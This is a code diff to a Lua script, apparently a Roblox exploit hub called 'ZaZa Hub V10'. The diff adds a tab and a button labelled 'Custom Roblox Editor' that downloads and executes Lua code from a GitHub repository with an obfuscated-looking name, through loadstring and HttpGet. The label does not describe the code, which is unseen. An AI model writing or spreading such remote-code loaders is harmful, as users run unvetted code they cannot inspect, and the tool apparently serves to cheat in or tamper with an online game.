@@ -1,3 +1,11 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib(" | ZaZa Hub V10 |                      | Added New Things |        ", "BloodTheme")
+local Window = Library.CreateLib(" | ZaZa Hub V10 |                              | Page Two |        ", "BloodTheme")
+
+			         
+               -- MAIN
+local Main = Window:NewTab("Personal Scripts")
+local MainSection = Main:NewSection("Personal Use Scripts")
+
+    MainSection:NewButton("Custom Roblox Editor", "Customize Roblox Settings", function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/CamiKillz/gghjhntgiesjidhiefsawjsdbgfshiajshdbsuafihndf8hasihd8sgafeh8yvsf8afhesdbsau8gsbdsu9gydsau9fs8dbhsua9/main/a",true))()    end)
 
